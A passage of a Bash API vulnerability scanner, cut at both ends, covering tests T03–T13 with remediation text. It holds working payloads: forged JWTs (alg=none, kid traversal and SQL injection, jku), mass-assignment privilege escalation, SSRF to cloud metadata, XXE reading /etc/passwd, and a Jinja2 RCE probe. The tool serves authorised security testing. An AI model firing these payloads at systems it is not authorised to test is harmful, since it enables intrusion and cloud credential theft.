    none_code=$(_curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${jwt_none}" "${api_ep}/admin" || true)
    echo "[T03] JWT none-alg → HTTP ${none_code}" >> "$evfile"
    if [[ "$none_code" =~ ^(200|201)$ ]]; then
        _SUMMARY_AUTH=1
        emit_finding "critical" \
            "JWT None Algorithm Accepted (${ip}:${port})" \
            "The server accepts JWT tokens with alg=none, bypassing signature verification at ${api_ep}/admin. An attacker can forge arbitrary tokens." \
            "Reject JWTs with alg=none. Use a strict algorithm allowlist (e.g., RS256 only). Validate alg field against server-side configuration." \
            "ev-09-${ip//./_}-t03-jwt-none"
    fi
    _tier_sleep

    [[ "${_SUMMARY_AUTH:-0}" -eq 0 ]] && log_ok "T03: No auth bypass detected"
}

# =============================================================================
# MRK:09_T04 — T04 RATE LIMITING | t04,rate,limiting,limit,throttle | L634-683
# NAV-RULE: read-toc-first
# =============================================================================

test_04_rate_limiting() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t04-rate-limit" "txt")"
    log "T04: Rate Limiting — ${base_url}"
    _SUMMARY_RATE=0

    local probe_urls=("${base_url}/login" "${base_url}/api/login" "${base_url}/auth/login"
                      "${base_url}${API_BASE}/${API_VERSION}/login" "${base_url}/signin"
                      "${base_url}/api/token" "${base_url}/oauth/token")

    for ep in "${probe_urls[@]}"; do
        local code
        code=$(_curl -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d '{"username":"ratetest","password":"ratetest123"}' "$ep" || true)
        echo "[T04] POST ${ep} → HTTP ${code}" >> "$evfile"
        [[ "$code" == "000" || "$code" == "" ]] && continue

        # Send 10 rapid requests and check for throttle response
        local throttled=0
        for i in $(seq 1 10); do
            local rc
            rc=$(_curl -o /dev/null -w "%{http_code}" -X POST \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"rateburst${i}\",\"password\":\"wrong${i}\"}" "$ep" || true)
            echo "[T04] Burst ${i} → HTTP ${rc}" >> "$evfile"
            if [[ "$rc" =~ ^(429|503|420)$ ]]; then
                throttled=1; break
            fi
        done

        if [[ "$throttled" -eq 0 && "$code" != "404" ]]; then
            _SUMMARY_RATE=1
            emit_finding "medium" \
                "Missing Rate Limiting on Login/Auth Endpoint (${ip}:${port})" \
                "No rate limiting or throttling detected at ${ep}. 10 rapid authentication requests were accepted without restriction. This enables brute-force attacks (OWASP API4)." \
                "Implement rate limiting (e.g., 5 req/min per IP on auth endpoints). Add CAPTCHA after failed attempts. Deploy account lockout after N failures. Use token bucket or sliding window algorithms." \
                "ev-09-${ip//./_}-t04-rate"
        fi
        _tier_sleep
    done

    [[ "${_SUMMARY_RATE:-0}" -eq 0 ]] && log_ok "T04: Rate limiting appears present"
}

# =============================================================================
# MRK:09_T05 — T05 CORS MISCONFIG | t05,cors,misconfig,origin,access | L684-737
# NAV-RULE: read-toc-first
# =============================================================================

test_05_cors() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t05-cors" "txt")"
    log "T05: CORS Misconfiguration — ${base_url}"
    _SUMMARY_CORS=0

    local malicious_origins=("https://evil.com" "https://attacker.io"
                              "null" "https://${ip}.evil.com"
                              "https://evil${ip//./_}.com")

    for origin in "${malicious_origins[@]}"; do
        local resp
        resp=$(_curl -D - -H "Origin: ${origin}" "${base_url}/" || true)
        local acao; acao=$(echo "$resp" | grep -i '^Access-Control-Allow-Origin:' | head -1 | tr -d '\r' || true)
        local acac; acac=$(echo "$resp" | grep -i '^Access-Control-Allow-Credentials:' | head -1 | tr -d '\r' || true)
        echo "[T05] Origin: ${origin}" >> "$evfile"
        echo "[T05]   ACAO: ${acao}"  >> "$evfile"
        echo "[T05]   ACAC: ${acac}"  >> "$evfile"

        if echo "$acao" | grep -qi "$origin" || echo "$acao" | grep -q '\*'; then
            local cred_flag=""
            echo "$acac" | grep -qi "true" && cred_flag=" with credentials=true"
            _SUMMARY_CORS=1
            emit_finding "high" \
                "CORS Misconfiguration — Arbitrary Origin Reflected${cred_flag} (${ip}:${port})" \
                "The server reflects arbitrary origins in Access-Control-Allow-Origin for Origin: ${origin}. ACAO: '${acao}' ACAC: '${acac}'. An attacker can make cross-origin requests from any domain${cred_flag}, exposing authenticated API responses." \
                "Maintain an explicit allowlist of trusted origins. Never reflect the request Origin value dynamically. Set Access-Control-Allow-Credentials: true only for strictly necessary origins." \
                "ev-09-${ip//./_}-t05-cors"
        fi
        _tier_sleep
    done

    # Null origin check (common misconfiguration)
    local null_resp
    null_resp=$(_curl -D - -H "Origin: null" "${base_url}/" || true)
    local null_acao; null_acao=$(echo "$null_resp" | grep -i '^Access-Control-Allow-Origin:' | head -1 || true)
    echo "[T05] Null origin ACAO: ${null_acao}" >> "$evfile"
    if echo "$null_acao" | grep -qi "null"; then
        _SUMMARY_CORS=1
        emit_finding "high" \
            "CORS Misconfiguration — Null Origin Trusted (${ip}:${port})" \
            "The server trusts the 'null' origin (ACAO: ${null_acao}). Sandboxed iframes and redirects can use the null origin to bypass CORS protections." \
            "Remove 'null' from the trusted origin allowlist. Explicitly enumerate all trusted origins." \
            "ev-09-${ip//./_}-t05-cors-null"
    fi

    [[ "${_SUMMARY_CORS:-0}" -eq 0 ]] && log_ok "T05: No CORS misconfig detected"
}

# =============================================================================
# MRK:09_T06 — T06 BOLA/IDOR | t06,bola,idor,object,reference | L738-782
# NAV-RULE: read-toc-first
# =============================================================================

test_06_bola_idor() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t06-bola" "txt")"
    log "T06: BOLA/IDOR — ${base_url}"
    _SUMMARY_BOLA=0

    # Build auth args array
    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    local idor_paths=("users" "accounts" "orders" "invoices" "profiles"
                      "documents" "files" "records" "tickets" "payments")

    local test_ids=("1" "2" "3" "100" "1000" "0" "-1" "admin" "me")

    for resource in "${idor_paths[@]}"; do
        for id in "${test_ids[@]}"; do
            local ep="${base_url}${API_BASE}/${API_VERSION}/${resource}/${id}"
            local code
            code=$(_curl -o /dev/null -w "%{http_code}" "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
            echo "[T06] GET ${ep} → HTTP ${code}" >> "$evfile"
            if [[ "$code" =~ ^(200|201)$ ]]; then
                local body
                body=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "$ep" | head -c 256 || true)
                echo "[T06] Body: ${body:0:200}" >> "$evfile"
                _SUMMARY_BOLA=1
                emit_finding "high" \
                    "BOLA/IDOR — Direct Object Reference Exposure (${ip}:${port} — ${resource}/${id})" \
                    "The endpoint ${ep} returns HTTP ${code} with data. Verify this resource belongs to the authenticated user. Sequential/predictable IDs indicate BOLA (OWASP API1): ${body:0:150}" \
                    "Implement object-level authorization checks. Use non-sequential, cryptographically random UUIDs for resource identifiers. Verify ownership on every object access." \
                    "ev-09-${ip//./_}-t06-bola"
                break 2
            fi
            _tier_sleep
        done
    done

    [[ "${_SUMMARY_BOLA:-0}" -eq 0 ]] && log_ok "T06: No obvious BOLA/IDOR found (manual testing recommended)"
}

# =============================================================================
# MRK:09_T07 — T07 MASS ASSIGNMENT | t07,mass,assignment,params | L783-836
# NAV-RULE: read-toc-first
# =============================================================================

test_07_mass_assignment() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t07-mass-assign" "txt")"
    log "T07: Mass Assignment / BOPLA — ${base_url}"

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    local endpoints=("${base_url}${API_BASE}/${API_VERSION}/users/profile"
                     "${base_url}${API_BASE}/${API_VERSION}/account"
                     "${base_url}${API_BASE}/${API_VERSION}/settings"
                     "${base_url}/profile" "${base_url}/account/update")

    # Payloads testing for privilege escalation via mass assignment
    local payloads=(
        '{"role":"admin","isAdmin":true,"admin":1}'
        '{"role":"superuser","permissions":["*"],"is_staff":true}'
        '{"user_type":"admin","privilege_level":9999}'
        '{"balance":999999,"credit":999999}'
        '{"verified":true,"email_verified":true,"phone_verified":true}'
        '{"__proto__":{"admin":true}}'
        '{"constructor":{"prototype":{"admin":true}}}'
    )

    for ep in "${endpoints[@]}"; do
        local code
        code=$(_curl -o /dev/null -w "%{http_code}" "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
        [[ "$code" == "000" || "$code" == "404" ]] && continue

        for payload in "${payloads[@]}"; do
            local resp_code
            resp_code=$(_curl -o /dev/null -w "%{http_code}" -X PUT \
                -H "Content-Type: application/json" \
                -d "$payload" \
                "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
            echo "[T07] PUT ${ep} payload=${payload:0:50} → HTTP ${resp_code}" >> "$evfile"
            if [[ "$resp_code" =~ ^(200|201|204)$ ]]; then
                emit_finding "high" \
                    "Mass Assignment / Property Injection Risk (${ip}:${port})" \
                    "Endpoint ${ep} accepted a PUT with sensitive properties: ${payload:0:80}. If the server binds request body directly to model, privilege escalation is possible (OWASP API3)." \
                    "Use explicit property allowlisting (DTO pattern). Never bind raw request body to domain models. Audit all writable properties per user role." \
                    "ev-09-${ip//./_}-t07-mass"
                break
            fi
            _tier_sleep
        done
    done
}

# =============================================================================
# MRK:09_T08 — T08 SECURITY HEADERS | t08,security,headers,csp,hsts | L837-904
# NAV-RULE: read-toc-first
# =============================================================================

test_08_security_headers() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t08-sec-headers" "txt")"
    log "T08: Security Headers — ${base_url}"

    local headers_resp
    headers_resp=$(_curl -D - -o /dev/null "${base_url}/" || true)
    echo "$headers_resp" >> "$evfile"

    declare -A required_headers
    required_headers["Strict-Transport-Security"]="Missing HSTS header — allows downgrade attacks"
    required_headers["Content-Security-Policy"]="Missing CSP — enables XSS attacks"
    required_headers["X-Content-Type-Options"]="Missing X-Content-Type-Options — MIME sniffing attacks"
    required_headers["X-Frame-Options"]="Missing X-Frame-Options — clickjacking attacks"
    required_headers["Referrer-Policy"]="Missing Referrer-Policy — sensitive URL leakage"
    required_headers["Permissions-Policy"]="Missing Permissions-Policy — feature abuse"
    required_headers["Cache-Control"]="Cache-Control header missing or permissive"
    required_headers["X-XSS-Protection"]="X-XSS-Protection missing (legacy but defense-in-depth)"

    local missing_headers=""
    for header in "${!required_headers[@]}"; do
        if ! echo "$headers_resp" | grep -qi "^${header}:"; then
            missing_headers+="${header}; "
            echo "[T08] MISSING: ${header}" >> "$evfile"
        else
            local val; val=$(echo "$headers_resp" | grep -i "^${header}:" | head -1 | tr -d '\r')
            echo "[T08] PRESENT: ${val}" >> "$evfile"
        fi
    done

    # Check for dangerous headers that should NOT be present
    if echo "$headers_resp" | grep -qi "^Server:"; then
        local srv; srv=$(echo "$headers_resp" | grep -i "^Server:" | head -1 | tr -d '\r')
        echo "[T08] Server banner: ${srv}" >> "$evfile"
        emit_finding "info" \
            "Server Version Disclosure in Response Headers (${ip}:${port})" \
            "The Server response header reveals software version: ${srv}. This aids attackers in identifying vulnerable versions." \
            "Configure web server to suppress or genericize the Server header (ServerTokens Prod for Apache; server_tokens off for Nginx)." \
            "ev-09-${ip//./_}-t08-server-banner"
    fi

    if echo "$headers_resp" | grep -qi "^X-Powered-By:"; then
        local powered; powered=$(echo "$headers_resp" | grep -i "^X-Powered-By:" | head -1 | tr -d '\r')
        echo "[T08] X-Powered-By: ${powered}" >> "$evfile"
        emit_finding "info" \
            "Technology Disclosure via X-Powered-By Header (${ip}:${port})" \
            "X-Powered-By header reveals backend technology: ${powered}." \
            "Remove X-Powered-By header in server/framework configuration." \
            "ev-09-${ip//./_}-t08-xpb"
    fi

    if [[ -n "$missing_headers" ]]; then
        emit_finding "medium" \
            "Missing Security Response Headers (${ip}:${port})" \
            "The following security headers are absent from ${base_url}: ${missing_headers}. Each missing header increases attack surface for XSS, clickjacking, MIME sniffing, and information disclosure." \
            "Implement all recommended security headers. Use a Content Security Policy builder to create strict CSP. Enable HSTS with includeSubDomains and preload. Refer to OWASP Secure Headers Project." \
            "ev-09-${ip//./_}-t08-headers"
        log_warn "T08: Missing — ${missing_headers}"
    else
        log_ok "T08: All security headers present"
    fi
}

# =============================================================================
# MRK:09_T09 — T09 JWT ATTACKS | t09,jwt,attacks,token,rs256 | L905-1004
# NAV-RULE: read-toc-first
# =============================================================================

test_09_jwt_attacks() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t09-jwt" "txt")"
    log "T09: JWT Advanced Attacks — ${base_url}"
    _SUMMARY_JWT=0

    # Only test if we have a valid token to mutate
    if [[ -z "${BEARER_TOKEN:-}" ]]; then
        log_info "T09: No --token provided — testing with crafted JWTs only"
    fi

    local api_ep="${base_url}${API_BASE}/${API_VERSION}"

    # Test 1: alg=none (already in T03 but deeper test here)
    local jwt_none="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ."
    local code; code=$(_curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${jwt_none}" "${api_ep}/users" || true)
    echo "[T09] alg=none → HTTP ${code}" >> "$evfile"
    [[ "$code" =~ ^(200|201)$ ]] && { _SUMMARY_JWT=1
        emit_finding "critical" "JWT Algorithm Confusion — alg=none Accepted (${ip}:${port})" \
            "Server accepts unsigned JWTs (alg=none) at ${api_ep}/users returning HTTP ${code}." \
            "Reject any JWT with alg=none. Maintain a server-side algorithm allowlist." \
            "ev-09-${ip//./_}-t09-jwt-none"; }
    _tier_sleep

    # Test 2: RS256→HS256 confusion (use server cert public key as HMAC secret — cannot compute here but probe header acceptance)
    local jwt_hs256_confused="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjAwMDAwMDAwfQ.dGVzdHNpZ25hdHVyZQ"
    code=$(_curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${jwt_hs256_confused}" "${api_ep}/users" || true)
    echo "[T09] RS256→HS256 confusion probe → HTTP ${code}" >> "$evfile"
    _tier_sleep

    # Test 3: kid path traversal
    local jwt_kid_traversal="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.dGVzdA"
    code=$(_curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${jwt_kid_traversal}" "${api_ep}/users" || true)
    echo "[T09] kid path traversal → HTTP ${code}" >> "$evfile"
    if [[ "$code" =~ ^(200|201|500)$ ]]; then
        _SUMMARY_JWT=1
        emit_finding "high" \
            "JWT kid Parameter Path Traversal Risk (${ip}:${port})" \
            "JWT with kid=../../../../etc/passwd returns HTTP ${code} at ${api_ep}/users. The server may be loading signing keys from user-controlled filesystem paths." \
            "Validate kid parameter against an allowlist of known key IDs. Never use kid as a direct file path. Store keys in a dedicated key store." \
            "ev-09-${ip//./_}-t09-kid-traversal"
    fi
    _tier_sleep

    # Test 4: kid SQL injection
    local jwt_kid_sqli="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEgVU5JT04gU0VMRUNUICdoYWNrZWQnLS0ifQ.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.dGVzdA"
    code=$(_curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${jwt_kid_sqli}" "${api_ep}/users" || true)
    echo "[T09] kid SQL injection → HTTP ${code}" >> "$evfile"
    if [[ "$code" =~ ^(200|201|500)$ ]]; then
        _SUMMARY_JWT=1
        emit_finding "critical" \
            "JWT kid Parameter SQL Injection (${ip}:${port})" \
            "JWT with SQL-injected kid returns HTTP ${code}. The server may be querying a database with unsanitized kid values, enabling authentication bypass and data exfiltration." \
            "Parameterize all database queries involving JWT claims. Validate kid against a strict format (UUID/alphanumeric only)." \
            "ev-09-${ip//./_}-t09-kid-sqli"
    fi
    _tier_sleep

    # Test 5: jku injection (server-side request to attacker-controlled JWKS)
    local jwt_jku="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjEvLndlbGwta25vd24vandrcy5qc29uIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.dGVzdA"
    code=$(_curl -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${jwt_jku}" "${api_ep}/users" || true)
    echo "[T09] jku injection probe → HTTP ${code}" >> "$evfile"
    if [[ "$code" =~ ^(200|201)$ ]]; then
        _SUMMARY_JWT=1
        emit_finding "critical" \
            "JWT jku Header Injection — Server Fetches Attacker JWKS (${ip}:${port})" \
            "JWT with jku pointing to 127.0.0.1 returns HTTP ${code}. The server fetches JWKS from the jku URL, allowing an attacker to host malicious signing keys." \
            "Never trust jku/x5u headers in JWTs. Use a hardcoded JWKS endpoint configured server-side. Validate that jku matches a pre-approved URL allowlist." \
            "ev-09-${ip//./_}-t09-jku"
    fi
    _tier_sleep

    # Test 6: Weak secret brute (detect if HS256 and try common secrets)
    if [[ -n "${BEARER_TOKEN:-}" ]]; then
        local common_secrets=("secret" "password" "123456" "jwt_secret" "your-256-bit-secret" "supersecret" "key" "token")
        for secret in "${common_secrets[@]}"; do
            # Quick header decode to check alg
            local header_b64; header_b64=$(echo "${BEARER_TOKEN}" | cut -d. -f1)
            local alg_field; alg_field=$(echo "${header_b64}==" | base64 -d 2>/dev/null | grep -o '"alg":"[^"]*"' || true)
            echo "[T09] Weak secret test: ${secret} (alg: ${alg_field})" >> "$evfile"
            if echo "$alg_field" | grep -qi "HS"; then
                log_info "T09: HS* alg detected — weak secret testing candidate (use jwt_tool for full attack)"
                emit_finding "medium" \
                    "JWT Uses HMAC Algorithm — Weak Secret Risk (${ip}:${port})" \
                    "The provided JWT uses HMAC signature (${alg_field}). HMAC JWTs are vulnerable to offline brute force if the secret is weak. Detected algorithm: ${alg_field}." \
                    "Switch to asymmetric algorithms (RS256/ES256). If HS256 is required, use cryptographically random secrets of at least 256 bits." \
                    "ev-09-${ip//./_}-t09-hmac"
                break
            fi
        done
    fi

    [[ "${_SUMMARY_JWT:-0}" -eq 0 ]] && log_ok "T09: No JWT vulnerabilities detected in automated probes"
}

# =============================================================================
# MRK:09_T10 — T10 GRAPHQL | t10,graphql,introspection,batch | L1005-1077
# NAV-RULE: read-toc-first
# =============================================================================

test_10_graphql() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t10-graphql" "txt")"
    log "T10: GraphQL Security — ${base_url}"
    _SUMMARY_GQL=0

    local gql_endpoints=("${base_url}${GRAPHQL_URL}" "${base_url}/graphql"
                          "${base_url}/api/graphql" "${base_url}/graphiql"
                          "${base_url}/playground" "${base_url}/gql"
                          "${base_url}${API_BASE}/graphql")

    for ep in "${gql_endpoints[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" "$ep" || true)
        [[ ! "$code" =~ ^(200|201|400)$ ]] && continue
        echo "[T10] GraphQL endpoint found: ${ep} (HTTP ${code})" >> "$evfile"
        _SUMMARY_GQL=1

        # Introspection query
        local intro_resp
        intro_resp=$(_curl -X POST -H "Content-Type: application/json" \
            -d '{"query":"{__schema{types{name}}}"}' "$ep" || true)
        echo "[T10] Introspection response: ${intro_resp:0:500}" >> "$evfile"

        if echo "$intro_resp" | grep -q "__schema"; then
            emit_finding "medium" \
                "GraphQL Introspection Enabled — Full Schema Exposed (${ip}:${port})" \
                "GraphQL introspection is enabled at ${ep}. Attackers can enumerate the complete API schema, all types, queries, mutations, and field names." \
                "Disable introspection in production. Use Apollo Server's introspection:false or graphql-disable-introspection middleware. Implement field-level authorization." \
                "ev-09-${ip//./_}-t10-introspection"
        fi

        # Batch query attack (alias batching)
        local batch_resp
        batch_resp=$(_curl -X POST -H "Content-Type: application/json" \
            -d '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]' "$ep" || true)
        echo "[T10] Batch query response: ${batch_resp:0:200}" >> "$evfile"
        if echo "$batch_resp" | grep -q '"data"'; then
            emit_finding "medium" \
                "GraphQL Batch Query Attack — No Rate Limiting on Batch Operations (${ip}:${port})" \
                "GraphQL endpoint ${ep} accepts batch queries without restriction. Attackers can batch thousands of operations in a single HTTP request, bypassing rate limits." \
                "Implement query depth limiting (max 5-10 levels), query complexity analysis, and disable or restrict batch operations. Use persisted queries in production." \
                "ev-09-${ip//./_}-t10-batch"
        fi

        # Deep nesting attack
        local deep_query='{"query":"{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p}}}}}}}}}}}}}}}}"}'
        local deep_resp
        deep_resp=$(_curl -X POST -H "Content-Type: application/json" -d "$deep_query" "$ep" || true)
        echo "[T10] Deep nesting response: ${deep_resp:0:200}" >> "$evfile"

        # Field suggestion (info leak)
        local suggest_resp
        suggest_resp=$(_curl -X POST -H "Content-Type: application/json" \
            -d '{"query":"{usr{id}}"}' "$ep" || true)
        if echo "$suggest_resp" | grep -qi "Did you mean"; then
            echo "[T10] Field suggestion leak detected" >> "$evfile"
            emit_finding "low" \
                "GraphQL Field Suggestion Information Leakage (${ip}:${port})" \
                "GraphQL endpoint ${ep} returns field name suggestions in error messages. This leaks schema information even when introspection is disabled." \
                "Configure GraphQL to suppress field suggestions in production. Use a custom error formatter that strips type/field hints from error messages." \
                "ev-09-${ip//./_}-t10-suggestions"
        fi
        _tier_sleep
    done

    [[ "${_SUMMARY_GQL:-0}" -eq 0 ]] && log_ok "T10: No GraphQL endpoint detected"
}

# =============================================================================
# MRK:09_T11 — T11 SSRF | t11,ssrf,imds,aws,gcp | L1078-1160
# NAV-RULE: read-toc-first
# =============================================================================

test_11_ssrf() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t11-ssrf" "txt")"
    log "T11: SSRF Detection — ${base_url}"
    _SUMMARY_SSRF=0

    # SSRF payload parameters
    local ssrf_params=("url" "redirect" "target" "dest" "destination" "uri" "source"
                       "src" "href" "page" "path" "file" "ref" "return" "returnUrl"
                       "callback" "next" "to" "go" "continue" "fetch" "load"
                       "proxy" "forward" "request" "image" "imageUrl" "avatar")

    # IMDS endpoints to probe for
    local ssrf_targets=(
        "http://169.254.169.254/latest/meta-data/"                        # AWS IMDSv1
        "http://169.254.169.254/metadata/v1/"                             # DigitalOcean
        "http://metadata.google.internal/computeMetadata/v1/"             # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01" # Azure
        "http://100.100.100.200/latest/meta-data/"                        # Alibaba
        "http://127.0.0.1/"                                               # localhost
        "http://[::1]/"                                                   # IPv6 localhost
        "http://0.0.0.0/"                                                 # 0.0.0.0
    )

    local probe_endpoints=("${base_url}/api/fetch" "${base_url}/api/proxy"
                           "${base_url}/api/load" "${base_url}/api/image"
                           "${base_url}${API_BASE}/${API_VERSION}/fetch"
                           "${base_url}/webhook" "${base_url}/api/webhook")

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    # Test URL parameters in GET requests
    for param in "${ssrf_params[@]}"; do
        for ssrf_target in "${ssrf_targets[@]}"; do
            local encoded_target; encoded_target=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${ssrf_target}'))" 2>/dev/null || echo "$ssrf_target")
            local ep="${base_url}/?${param}=${encoded_target}"
            local resp
            resp=$(_curl -D - "${auth_args[@]+"${auth_args[@]}"}" "$ep" | head -c 512 || true)
            echo "[T11] GET ${param}=${ssrf_target:0:40} → ${resp:0:100}" >> "$evfile"
            if echo "$resp" | grep -qiE "(ami-id|instance-id|metadata|computeMetadata|localhost|127\.0\.0\.1)"; then
                _SUMMARY_SSRF=1
                emit_finding "critical" \
                    "Server-Side Request Forgery (SSRF) — IMDS Response Returned (${ip}:${port})" \
                    "SSRF via parameter '${param}' targeting ${ssrf_target} returned IMDS/internal content at ${ep}. An attacker can exfiltrate cloud credentials, IAM roles, and internal service responses (OWASP API7)." \
                    "Implement a strict URL allowlist for any server-side fetch operations. Block RFC 1918, link-local, and loopback ranges at the network layer. Disable IMDSv1 (use IMDSv2 with session tokens on AWS)." \
                    "ev-09-${ip//./_}-t11-ssrf"
            fi
            _tier_sleep
        done
    done

    # Test POST endpoints
    for ep in "${probe_endpoints[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" \
            "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
        [[ "$code" == "404" || "$code" == "000" ]] && continue

        local ssrf_body='{"url":"http://169.254.169.254/latest/meta-data/","target":"http://169.254.169.254/"}'
        local resp
        resp=$(_curl -X POST -H "Content-Type: application/json" \
            -d "$ssrf_body" \
            "${auth_args[@]+"${auth_args[@]}"}" "$ep" | head -c 512 || true)
        echo "[T11] POST SSRF ${ep} → ${resp:0:200}" >> "$evfile"
        if echo "$resp" | grep -qiE "(ami-id|instance-id|metadata|iam|role|credential)"; then
            _SUMMARY_SSRF=1
            emit_finding "critical" \
                "SSRF via API Endpoint — Internal Service Response (${ip}:${port})" \
                "SSRF payload targeting 169.254.169.254 (AWS IMDS) via POST to ${ep} returned IMDS content. Cloud credentials are at risk." \
                "Block all outbound requests to IMDS ranges. Validate and allowlist all server-side URL fetches. Use instance profile scoping." \
                "ev-09-${ip//./_}-t11-ssrf-post"
        fi
        _tier_sleep
    done

    [[ "${_SUMMARY_SSRF:-0}" -eq 0 ]] && log_ok "T11: No SSRF responses detected (intercepting proxy recommended for full coverage)"
}

# =============================================================================
# MRK:09_T12 — T12 XXE | t12,xxe,xml,entity,oob | L1161-1214
# NAV-RULE: read-toc-first
# =============================================================================

test_12_xxe() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t12-xxe" "txt")"
    log "T12: XXE Injection — ${base_url}"

    # Gate: only send XML payloads to endpoints that accept XML
    local xml_endpoints=()
    local probe_paths=("${base_url}/api/upload" "${base_url}/api/import"
                       "${base_url}/upload" "${base_url}/import"
                       "${base_url}${API_BASE}/${API_VERSION}/import"
                       "${base_url}/soap" "${base_url}/ws" "${base_url}/api/xml"
                       "${base_url}/api/data" "${base_url}/data")

    for ep in "${probe_paths[@]}"; do
        local code; code=$(_curl -o /dev/null -w "%{http_code}" -X POST \
            -H "Content-Type: application/xml" \
            -d '<?xml version="1.0"?><test>probe</test>' "$ep" || true)
        echo "[T12] XML probe ${ep} → HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201|400|422|500)$ ]] && [[ "$code" != "415" ]]; then
            xml_endpoints+=("$ep")
            log_info "T12: XML endpoint detected: ${ep} (${code})"
        fi
        _tier_sleep
    done

    [[ "${#xml_endpoints[@]}" -eq 0 ]] && { log_ok "T12: No XML-accepting endpoints found"; return; }

    local xxe_file_read='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
    local xxe_ssrf='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'
    local xxe_oob='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://169.254.169.254/">%remote;]><root>oob</root>'

    for ep in "${xml_endpoints[@]}"; do
        for xxe_payload in "$xxe_file_read" "$xxe_ssrf"; do
            local resp
            resp=$(_curl -X POST -H "Content-Type: application/xml" -d "$xxe_payload" "$ep" | head -c 512 || true)
            echo "[T12] XXE ${ep}: ${resp:0:200}" >> "$evfile"
            if echo "$resp" | grep -qE "(root:|nobody:|daemon:|/bin/bash|ami-id|instance-id)"; then
                emit_finding "critical" \
                    "XXE Injection — Successful File/SSRF Read (${ip}:${port})" \
                    "XML External Entity injection at ${ep} returned internal content: ${resp:0:150}. An attacker can read local files, enumerate internal services, and exfiltrate data." \
                    "Disable external entity processing in all XML parsers. Use document builder factory with setFeature DISALLOW_DOCTYPE_DECL=true. Prefer JSON APIs over XML." \
                    "ev-09-${ip//./_}-t12-xxe"
                break
            fi
            _tier_sleep
        done
    done
}

# =============================================================================
# MRK:09_T13 — T13 SSTI | t13,ssti,template,injection | L1215-1269
# NAV-RULE: read-toc-first
# =============================================================================

test_13_ssti() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "api-t13-ssti" "txt")"
    log "T13: Server-Side Template Injection — ${base_url}"

    # Polyglot SSTI probes: covers Jinja2, Twig, Smarty, Freemarker, Velocity, Mako, ERB, Pebble
    local ssti_probes=(
        "{{7*7}}"          # Jinja2/Twig → 49
        "\${7*7}"          # Freemarker/Spring → 49
        "<%=7*7%>"         # ERB/Mako → 49
        "#{7*7}"           # Ruby → 49
        "*{7*7}"           # Spring SpEL
        "{{7*'7'}}"        # Twig → 7777777
        "${{7*7}}"         # Pebble
        "{7*7}"            # Smarty
        "{{config}}"       # Jinja2 config dump
        "{{self.__class__.__mro__[1].__subclasses__()}}" # Jinja2 RCE
    )

    # Common injectable parameters
    local ssti_params=("name" "template" "content" "message" "subject" "body"
                       "text" "title" "label" "query" "input" "value"
                       "search" "q" "msg" "page")

    local -a auth_args
    mapfile -t auth_args < <(_auth_args)

    for probe in "${ssti_probes[@]}"; do
        local encoded; encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${probe}'))" 2>/dev/null || echo "$probe")
        for param in "${ssti_params[@]}"; do
